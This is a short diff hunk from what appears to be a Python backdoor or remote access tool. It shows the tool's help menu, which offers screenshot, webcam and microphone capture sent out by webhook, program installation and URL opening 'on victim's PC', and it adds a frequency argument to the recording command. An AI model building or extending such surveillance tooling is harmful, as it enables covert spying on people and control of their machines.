@@ -33,7 +33,7 @@ class back:
                     "|| 1.) bye                 -- To close the session             ||\n"+
                     "|| 2.) screen -webhook     -- To take screenshot.              ||\n"+
                     "|| 3.) webcam -webhook     -- To take webcam photo.            ||\n"+
-                    "|| 4.) record t c web      -- To record sound from Mic.        ||\n"+
+                    "|| 4.) record t c freq web -- To record sound from Mic.        ||\n"+
                     "|| 5.) list                -- To list the process id.          ||\n"+
                     "|| 6.) install             -- To install any program.          ||\n"+
                     "|| 7.) open -link          -- To open any url on victim's PC   ||\n"+
